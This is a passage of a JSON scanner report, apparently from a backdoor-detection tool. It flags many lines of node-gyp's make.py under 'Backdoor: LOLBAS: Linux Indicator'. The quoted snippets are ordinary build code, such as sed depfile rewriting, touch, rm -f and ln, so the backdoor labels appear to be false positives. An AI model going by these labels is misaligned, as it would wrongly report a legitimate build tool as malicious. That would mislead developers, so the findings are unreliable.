          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1305,
                  "startColumn": 43,
                  "endLine": 1305,
                  "endColumn": 51,
                  "snippet": {
                    "text": "                # Copying the environment variables into global make variables doesn't\n                # work either, because then the .d files will potentially contain spaces\n                # after variable expansion, and .d file handling cannot handle spaces.\n                # As a workaround, manually expand variables at gyp time. Since 'copies'\n                # can't run scripts, there's no need to write the env then.\n                # WriteDoCmd() will escape spaces for .d files.\n                env = self.GetSortedXcodeEnv()\n",
                    "rendered": {
                      "text": "                # Copying the environment variables into global make variables doesn't\n                # work either, because then the .d files will potentially contain spaces\n                # after variable expansion, and .d file handling cannot handle spaces.\n                # As a workaround, manually expand variables at gyp time. Since 'copies'\n                # can't run scripts, there's no need to write the env then.\n                # WriteDoCmd() will escape spaces for .d files.\n                env = self.GetSortedXcodeEnv()\n",
                      "markdown": "`                # Copying the environment variables into global make variables doesn't\n                # work either, because then the .d files will potentially contain spaces\n                # after variable expansion, and .d file handling cannot handle spaces.\n                # As a workaround, manually expand variables at gyp time. Since 'copies'\n                # can't run scripts, there's no need to write the env then.\n                # WriteDoCmd() will escape spaces for .d files.\n                env = self.GetSortedXcodeEnv()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1196,
                  "startColumn": 64,
                  "endLine": 1196,
                  "endColumn": 69,
                  "snippet": {
                    "text": "                    # amount of pain.\n                    actions += [\"@touch --no-create $@\"]\n\n                # See the comment in WriteCopies about expanding env vars.\n                outputs = [gyp.xcode_emulation.ExpandEnvVars(o, env) for o in outputs]\n                inputs = [gyp.xcode_emulation.ExpandEnvVars(i, env) for i in inputs]\n\n",
                    "rendered": {
                      "text": "                    # amount of pain.\n                    actions += [\"@touch --no-create $@\"]\n\n                # See the comment in WriteCopies about expanding env vars.\n                outputs = [gyp.xcode_emulation.ExpandEnvVars(o, env) for o in outputs]\n                inputs = [gyp.xcode_emulation.ExpandEnvVars(i, env) for i in inputs]\n\n",
                      "markdown": "`                    # amount of pain.\n                    actions += [\"@touch --no-create $@\"]\n\n                # See the comment in WriteCopies about expanding env vars.\n                outputs = [gyp.xcode_emulation.ExpandEnvVars(o, env) for o in outputs]\n                inputs = [gyp.xcode_emulation.ExpandEnvVars(i, env) for i in inputs]\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1151,
                  "startColumn": 7,
                  "endLine": 1151,
                  "endColumn": 12,
                  "snippet": {
                    "text": "                       rules (used to make other pieces dependent on these rules)\n        part_of_all: flag indicating this target is part of 'all'\n        \"\"\"\n        env = self.GetSortedXcodeEnv()\n        for rule in rules:\n            name = StringToMakefileVariable(\n                \"{}_{}\".format(self.qualified_target, rule[\"rule_name\"])\n",
                    "rendered": {
                      "text": "                       rules (used to make other pieces dependent on these rules)\n        part_of_all: flag indicating this target is part of 'all'\n        \"\"\"\n        env = self.GetSortedXcodeEnv()\n        for rule in rules:\n            name = StringToMakefileVariable(\n                \"{}_{}\".format(self.qualified_target, rule[\"rule_name\"])\n",
                      "markdown": "`                       rules (used to make other pieces dependent on these rules)\n        part_of_all: flag indicating this target is part of 'all'\n        \"\"\"\n        env = self.GetSortedXcodeEnv()\n        for rule in rules:\n            name = StringToMakefileVariable(\n                \"{}_{}\".format(self.qualified_target, rule[\"rule_name\"])\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1116,
                  "startColumn": 60,
                  "endLine": 1116,
                  "endColumn": 65,
                  "snippet": {
                    "text": "                    \"Spaces in action output filenames not supported (%s)\" % output\n                )\n\n            # See the comment in WriteCopies about expanding env vars.\n            outputs = [gyp.xcode_emulation.ExpandEnvVars(o, env) for o in outputs]\n            inputs = [gyp.xcode_emulation.ExpandEnvVars(i, env) for i in inputs]\n\n",
                    "rendered": {
                      "text": "                    \"Spaces in action output filenames not supported (%s)\" % output\n                )\n\n            # See the comment in WriteCopies about expanding env vars.\n            outputs = [gyp.xcode_emulation.ExpandEnvVars(o, env) for o in outputs]\n            inputs = [gyp.xcode_emulation.ExpandEnvVars(i, env) for i in inputs]\n\n",
                      "markdown": "`                    \"Spaces in action output filenames not supported (%s)\" % output\n                )\n\n            # See the comment in WriteCopies about expanding env vars.\n            outputs = [gyp.xcode_emulation.ExpandEnvVars(o, env) for o in outputs]\n            inputs = [gyp.xcode_emulation.ExpandEnvVars(i, env) for i in inputs]\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1095,
                  "startColumn": 56,
                  "endLine": 1095,
                  "endColumn": 61,
                  "snippet": {
                    "text": "                )\n            self.WriteLn()\n            outputs = [self.Absolutify(o) for o in outputs]\n            # The makefile rules are all relative to the top dir, but the gyp actions\n            # are defined relative to their containing dir.  This replaces the obj\n            # variable for the action rule with an absolute version so that the output\n            # goes in the right place.\n",
                    "rendered": {
                      "text": "                )\n            self.WriteLn()\n            outputs = [self.Absolutify(o) for o in outputs]\n            # The makefile rules are all relative to the top dir, but the gyp actions\n            # are defined relative to their containing dir.  This replaces the obj\n            # variable for the action rule with an absolute version so that the output\n            # goes in the right place.\n",
                      "markdown": "`                )\n            self.WriteLn()\n            outputs = [self.Absolutify(o) for o in outputs]\n            # The makefile rules are all relative to the top dir, but the gyp actions\n            # are defined relative to their containing dir.  This replaces the obj\n            # variable for the action rule with an absolute version so that the output\n            # goes in the right place.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1027,
                  "startColumn": 7,
                  "endLine": 1027,
                  "endColumn": 12,
                  "snippet": {
                    "text": "                       actions)\n        part_of_all: flag indicating this target is part of 'all'\n        \"\"\"\n        env = self.GetSortedXcodeEnv()\n        for action in actions:\n            name = StringToMakefileVariable(\n                \"{}_{}\".format(self.qualified_target, action[\"action_name\"])\n",
                    "rendered": {
                      "text": "                       actions)\n        part_of_all: flag indicating this target is part of 'all'\n        \"\"\"\n        env = self.GetSortedXcodeEnv()\n        for action in actions:\n            name = StringToMakefileVariable(\n                \"{}_{}\".format(self.qualified_target, action[\"action_name\"])\n",
                      "markdown": "`                       actions)\n        part_of_all: flag indicating this target is part of 'all'\n        \"\"\"\n        env = self.GetSortedXcodeEnv()\n        for action in actions:\n            name = StringToMakefileVariable(\n                \"{}_{}\".format(self.qualified_target, action[\"action_name\"])\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 508,
                  "startColumn": 20,
                  "endLine": 508,
                  "endColumn": 26,
                  "snippet": {
                    "text": "\"\"\"\n    \"\"\"\n# Helper to compare the command we're about to run against the command\n# we logged the last time we ran the command.  Produces an empty\n# string (false) when the commands match.\n# Tricky point: Make has no string-equality test function.\n# The kernel uses the following, but it seems like it would have false\n",
                    "rendered": {
                      "text": "\"\"\"\n    \"\"\"\n# Helper to compare the command we're about to run against the command\n# we logged the last time we ran the command.  Produces an empty\n# string (false) when the commands match.\n# Tricky point: Make has no string-equality test function.\n# The kernel uses the following, but it seems like it would have false\n",
                      "markdown": "`\"\"\"\n    \"\"\"\n# Helper to compare the command we're about to run against the command\n# we logged the last time we ran the command.  Produces an empty\n# string (false) when the commands match.\n# Tricky point: Make has no string-equality test function.\n# The kernel uses the following, but it seems like it would have false\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 483,
                  "startColumn": 57,
                  "endLine": 483,
                  "endColumn": 61,
                  "snippet": {
                    "text": "\nquiet_cmd_copy = COPY $@\n# send stderr to /dev/null to ignore messages when linking directories.\ncmd_copy = ln -f \"$<\" \"$@\" 2>/dev/null || (rm -rf \"$@\" && cp %(copy_archive_args)s \"$<\" \"$@\")\n\nquiet_cmd_symlink = SYMLINK $@\ncmd_symlink = ln -sf \"$<\" \"$@\"\n",
                    "rendered": {
                      "text": "\nquiet_cmd_copy = COPY $@\n# send stderr to /dev/null to ignore messages when linking directories.\ncmd_copy = ln -f \"$<\" \"$@\" 2>/dev/null || (rm -rf \"$@\" && cp %(copy_archive_args)s \"$<\" \"$@\")\n\nquiet_cmd_symlink = SYMLINK $@\ncmd_symlink = ln -sf \"$<\" \"$@\"\n",
                      "markdown": "`\nquiet_cmd_copy = COPY $@\n# send stderr to /dev/null to ignore messages when linking directories.\ncmd_copy = ln -f \"$<\" \"$@\" 2>/dev/null || (rm -rf \"$@\" && cp %(copy_archive_args)s \"$<\" \"$@\")\n\nquiet_cmd_symlink = SYMLINK $@\ncmd_symlink = ln -sf \"$<\" \"$@\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 462,
                  "startColumn": 1,
                  "endLine": 462,
                  "endColumn": 6,
                  "snippet": {
                    "text": "sed -e 's|\\\\\\\\||' -e 'y| |\\\\n|' $(depfile).raw |\\\\\"\"\") +\n    r\"\"\"\n  grep -v '^$$'                             |\\\n  sed -e 1d -e 's|$$|:|'                     \\\n    >> $(depfile)\nrm $(depfile).raw\nendef\n",
                    "rendered": {
                      "text": "sed -e 's|\\\\\\\\||' -e 'y| |\\\\n|' $(depfile).raw |\\\\\"\"\") +\n    r\"\"\"\n  grep -v '^$$'                             |\\\n  sed -e 1d -e 's|$$|:|'                     \\\n    >> $(depfile)\nrm $(depfile).raw\nendef\n",
                      "markdown": "`sed -e 's|\\\\\\\\||' -e 'y| |\\\\n|' $(depfile).raw |\\\\\"\"\") +\n    r\"\"\"\n  grep -v '^$$'                             |\\\n  sed -e 1d -e 's|$$|:|'                     \\\n    >> $(depfile)\nrm $(depfile).raw\nendef\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 461,
                  "startColumn": 1,
                  "endLine": 461,
                  "endColumn": 7,
                  "snippet": {
                    "text": "    if sys.platform == 'win32' else \"\"\"\nsed -e 's|\\\\\\\\||' -e 'y| |\\\\n|' $(depfile).raw |\\\\\"\"\") +\n    r\"\"\"\n  grep -v '^$$'                             |\\\n  sed -e 1d -e 's|$$|:|'                     \\\n    >> $(depfile)\nrm $(depfile).raw\n",
                    "rendered": {
                      "text": "    if sys.platform == 'win32' else \"\"\"\nsed -e 's|\\\\\\\\||' -e 'y| |\\\\n|' $(depfile).raw |\\\\\"\"\") +\n    r\"\"\"\n  grep -v '^$$'                             |\\\n  sed -e 1d -e 's|$$|:|'                     \\\n    >> $(depfile)\nrm $(depfile).raw\n",
                      "markdown": "`    if sys.platform == 'win32' else \"\"\"\nsed -e 's|\\\\\\\\||' -e 'y| |\\\\n|' $(depfile).raw |\\\\\"\"\") +\n    r\"\"\"\n  grep -v '^$$'                             |\\\n  sed -e 1d -e 's|$$|:|'                     \\\n    >> $(depfile)\nrm $(depfile).raw\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 458,
                  "startColumn": 39,
                  "endLine": 459,
                  "endColumn": 4,
                  "snippet": {
                    "text": "# delete the first line and append a colon to the remaining lines.\"\"\" +\n    (\"\"\"\nsed -e 's/\\\\\\\\\\\\\\\\$$//' -e 's/\\\\\\\\\\\\\\\\/\\\\//g' -e 'y| |\\\\n|' $(depfile).raw |\\\\\"\"\"\n    if sys.platform == 'win32' else \"\"\"\nsed -e 's|\\\\\\\\||' -e 'y| |\\\\n|' $(depfile).raw |\\\\\"\"\") +\n    r\"\"\"\n  grep -v '^$$'                             |\\\n  sed -e 1d -e 's|$$|:|'                     \\\n",
                    "rendered": {
                      "text": "# delete the first line and append a colon to the remaining lines.\"\"\" +\n    (\"\"\"\nsed -e 's/\\\\\\\\\\\\\\\\$$//' -e 's/\\\\\\\\\\\\\\\\/\\\\//g' -e 'y| |\\\\n|' $(depfile).raw |\\\\\"\"\"\n    if sys.platform == 'win32' else \"\"\"\nsed -e 's|\\\\\\\\||' -e 'y| |\\\\n|' $(depfile).raw |\\\\\"\"\") +\n    r\"\"\"\n  grep -v '^$$'                             |\\\n  sed -e 1d -e 's|$$|:|'                     \\\n",
                      "markdown": "`# delete the first line and append a colon to the remaining lines.\"\"\" +\n    (\"\"\"\nsed -e 's/\\\\\\\\\\\\\\\\$$//' -e 's/\\\\\\\\\\\\\\\\/\\\\//g' -e 'y| |\\\\n|' $(depfile).raw |\\\\\"\"\"\n    if sys.platform == 'win32' else \"\"\"\nsed -e 's|\\\\\\\\||' -e 'y| |\\\\n|' $(depfile).raw |\\\\\"\"\") +\n    r\"\"\"\n  grep -v '^$$'                             |\\\n  sed -e 1d -e 's|$$|:|'                     \\\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 456,
                  "startColumn": 8,
                  "endLine": 457,
                  "endColumn": 4,
                  "snippet": {
                    "text": "# We remove slashes and replace spaces with new lines;\n# remove blank lines;\n# delete the first line and append a colon to the remaining lines.\"\"\" +\n    (\"\"\"\nsed -e 's/\\\\\\\\\\\\\\\\$$//' -e 's/\\\\\\\\\\\\\\\\/\\\\//g' -e 'y| |\\\\n|' $(depfile).raw |\\\\\"\"\"\n    if sys.platform == 'win32' else \"\"\"\nsed -e 's|\\\\\\\\||' -e 'y| |\\\\n|' $(depfile).raw |\\\\\"\"\") +\n    r\"\"\"\n",
                    "rendered": {
                      "text": "# We remove slashes and replace spaces with new lines;\n# remove blank lines;\n# delete the first line and append a colon to the remaining lines.\"\"\" +\n    (\"\"\"\nsed -e 's/\\\\\\\\\\\\\\\\$$//' -e 's/\\\\\\\\\\\\\\\\/\\\\//g' -e 'y| |\\\\n|' $(depfile).raw |\\\\\"\"\"\n    if sys.platform == 'win32' else \"\"\"\nsed -e 's|\\\\\\\\||' -e 'y| |\\\\n|' $(depfile).raw |\\\\\"\"\") +\n    r\"\"\"\n",
                      "markdown": "`# We remove slashes and replace spaces with new lines;\n# remove blank lines;\n# delete the first line and append a colon to the remaining lines.\"\"\" +\n    (\"\"\"\nsed -e 's/\\\\\\\\\\\\\\\\$$//' -e 's/\\\\\\\\\\\\\\\\/\\\\//g' -e 'y| |\\\\n|' $(depfile).raw |\\\\\"\"\"\n    if sys.platform == 'win32' else \"\"\"\nsed -e 's|\\\\\\\\||' -e 'y| |\\\\n|' $(depfile).raw |\\\\\"\"\") +\n    r\"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 449,
                  "startColumn": 40,
                  "endLine": 450,
                  "endColumn": 4,
                  "snippet": {
                    "text": "# Fixup path as in (1).\"\"\" +\n    (r\"\"\"\nsed -e \"s|^$(notdir $@)|$@|\" -re 's/\\\\\\\\([^$$])/\\/\\1/g' $(depfile).raw >> $(depfile)\"\"\"\n    if sys.platform == 'win32' else r\"\"\"\nsed -e \"s|^$(notdir $@)|$@|\" $(depfile).raw >> $(depfile)\"\"\") +\n    r\"\"\"\n# Add extra rules as in (2).\n# We remove slashes and replace spaces with new lines;\n",
                    "rendered": {
                      "text": "# Fixup path as in (1).\"\"\" +\n    (r\"\"\"\nsed -e \"s|^$(notdir $@)|$@|\" -re 's/\\\\\\\\([^$$])/\\/\\1/g' $(depfile).raw >> $(depfile)\"\"\"\n    if sys.platform == 'win32' else r\"\"\"\nsed -e \"s|^$(notdir $@)|$@|\" $(depfile).raw >> $(depfile)\"\"\") +\n    r\"\"\"\n# Add extra rules as in (2).\n# We remove slashes and replace spaces with new lines;\n",
                      "markdown": "`# Fixup path as in (1).\"\"\" +\n    (r\"\"\"\nsed -e \"s|^$(notdir $@)|$@|\" -re 's/\\\\\\\\([^$$])/\\/\\1/g' $(depfile).raw >> $(depfile)\"\"\"\n    if sys.platform == 'win32' else r\"\"\"\nsed -e \"s|^$(notdir $@)|$@|\" $(depfile).raw >> $(depfile)\"\"\") +\n    r\"\"\"\n# Add extra rules as in (2).\n# We remove slashes and replace spaces with new lines;\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 447,
                  "startColumn": 9,
                  "endLine": 448,
                  "endColumn": 4,
                  "snippet": {
                    "text": "# The depfile may not exist if the input file didn't have any #includes.\ntouch $(depfile).raw\n# Fixup path as in (1).\"\"\" +\n    (r\"\"\"\nsed -e \"s|^$(notdir $@)|$@|\" -re 's/\\\\\\\\([^$$])/\\/\\1/g' $(depfile).raw >> $(depfile)\"\"\"\n    if sys.platform == 'win32' else r\"\"\"\nsed -e \"s|^$(notdir $@)|$@|\" $(depfile).raw >> $(depfile)\"\"\") +\n    r\"\"\"\n",
                    "rendered": {
                      "text": "# The depfile may not exist if the input file didn't have any #includes.\ntouch $(depfile).raw\n# Fixup path as in (1).\"\"\" +\n    (r\"\"\"\nsed -e \"s|^$(notdir $@)|$@|\" -re 's/\\\\\\\\([^$$])/\\/\\1/g' $(depfile).raw >> $(depfile)\"\"\"\n    if sys.platform == 'win32' else r\"\"\"\nsed -e \"s|^$(notdir $@)|$@|\" $(depfile).raw >> $(depfile)\"\"\") +\n    r\"\"\"\n",
                      "markdown": "`# The depfile may not exist if the input file didn't have any #includes.\ntouch $(depfile).raw\n# Fixup path as in (1).\"\"\" +\n    (r\"\"\"\nsed -e \"s|^$(notdir $@)|$@|\" -re 's/\\\\\\\\([^$$])/\\/\\1/g' $(depfile).raw >> $(depfile)\"\"\"\n    if sys.platform == 'win32' else r\"\"\"\nsed -e \"s|^$(notdir $@)|$@|\" $(depfile).raw >> $(depfile)\"\"\") +\n    r\"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 439,
                  "startColumn": 44,
                  "endLine": 439,
                  "endColumn": 49,
                  "snippet": {
                    "text": "#   DEP3:\n# so if the files are missing, they're just considered phony rules.\n# We have to do some pretty insane escaping to get those backslashes\n# and dollar signs past make, the shell, and sed at the same time.\n# Doesn't work with spaces, but that's fine: .d files have spaces in\n# their names replaced with other characters.\"\"\"\n    r\"\"\"\n",
                    "rendered": {
                      "text": "#   DEP3:\n# so if the files are missing, they're just considered phony rules.\n# We have to do some pretty insane escaping to get those backslashes\n# and dollar signs past make, the shell, and sed at the same time.\n# Doesn't work with spaces, but that's fine: .d files have spaces in\n# their names replaced with other characters.\"\"\"\n    r\"\"\"\n",
                      "markdown": "`#   DEP3:\n# so if the files are missing, they're just considered phony rules.\n# We have to do some pretty insane escaping to get those backslashes\n# and dollar signs past make, the shell, and sed at the same time.\n# Doesn't work with spaces, but that's fine: .d files have spaces in\n# their names replaced with other characters.\"\"\"\n    r\"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 231,
                  "startColumn": 6,
                  "endLine": 232,
                  "snippet": {
                    "text": "cmd_alink_thin = rm -f $@ && $(AR.$(TOOLSET)) crsT $@ $(filter %.o,$^)\n\n# Note: this does not handle spaces in paths\ndefine xargs\n  $(1) $(word 1,$(2))\n$(if $(word 2,$(2)),$(call xargs,$(1),$(wordlist 2,$(words $(2)),$(2))))\nendef\n\n",
                    "rendered": {
                      "text": "cmd_alink_thin = rm -f $@ && $(AR.$(TOOLSET)) crsT $@ $(filter %.o,$^)\n\n# Note: this does not handle spaces in paths\ndefine xargs\n  $(1) $(word 1,$(2))\n$(if $(word 2,$(2)),$(call xargs,$(1),$(wordlist 2,$(words $(2)),$(2))))\nendef\n\n",
                      "markdown": "`cmd_alink_thin = rm -f $@ && $(AR.$(TOOLSET)) crsT $@ $(filter %.o,$^)\n\n# Note: this does not handle spaces in paths\ndefine xargs\n  $(1) $(word 1,$(2))\n$(if $(word 2,$(2)),$(call xargs,$(1),$(wordlist 2,$(words $(2)),$(2))))\nendef\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 162,
                  "startColumn": 6,
                  "endLine": 163,
                  "snippet": {
                    "text": "cmd_link = $(LINK.$(TOOLSET)) -o $@ $(GYP_LDFLAGS) $(LDFLAGS.$(TOOLSET)) -Wl,--start-group $(LD_INPUTS) $(LIBS) -Wl,--end-group\n\n# Note: this does not handle spaces in paths\ndefine xargs\n  $(1) $(word 1,$(2))\n$(if $(word 2,$(2)),$(call xargs,$(1),$(wordlist 2,$(words $(2)),$(2))))\nendef\n\n",
                    "rendered": {
                      "text": "cmd_link = $(LINK.$(TOOLSET)) -o $@ $(GYP_LDFLAGS) $(LDFLAGS.$(TOOLSET)) -Wl,--start-group $(LD_INPUTS) $(LIBS) -Wl,--end-group\n\n# Note: this does not handle spaces in paths\ndefine xargs\n  $(1) $(word 1,$(2))\n$(if $(word 2,$(2)),$(call xargs,$(1),$(wordlist 2,$(words $(2)),$(2))))\nendef\n\n",
                      "markdown": "`cmd_link = $(LINK.$(TOOLSET)) -o $@ $(GYP_LDFLAGS) $(LDFLAGS.$(TOOLSET)) -Wl,--start-group $(LD_INPUTS) $(LIBS) -Wl,--end-group\n\n# Note: this does not handle spaces in paths\ndefine xargs\n  $(1) $(word 1,$(2))\n$(if $(word 2,$(2)),$(call xargs,$(1),$(wordlist 2,$(words $(2)),$(2))))\nendef\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 138,
                  "startColumn": 15,
                  "endLine": 138,
                  "endColumn": 21,
                  "snippet": {
                    "text": "# The .d checking code below uses these functions:\n# wildcard, sort, foreach, shell, wordlist\n# wildcard can handle spaces, the rest can't.\n# Since I could find no way to make foreach work with spaces in filenames\n# correctly, the .d files have spaces replaced with another character. The .d\n# file for\n#     Chromium\\ Framework.framework/foo\n",
                    "rendered": {
                      "text": "# The .d checking code below uses these functions:\n# wildcard, sort, foreach, shell, wordlist\n# wildcard can handle spaces, the rest can't.\n# Since I could find no way to make foreach work with spaces in filenames\n# correctly, the .d files have spaces replaced with another character. The .d\n# file for\n#     Chromium\\ Framework.framework/foo\n",
                      "markdown": "`# The .d checking code below uses these functions:\n# wildcard, sort, foreach, shell, wordlist\n# wildcard can handle spaces, the rest can't.\n# Since I could find no way to make foreach work with spaces in filenames\n# correctly, the .d files have spaces replaced with another character. The .d\n# file for\n#     Chromium\\ Framework.framework/foo\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
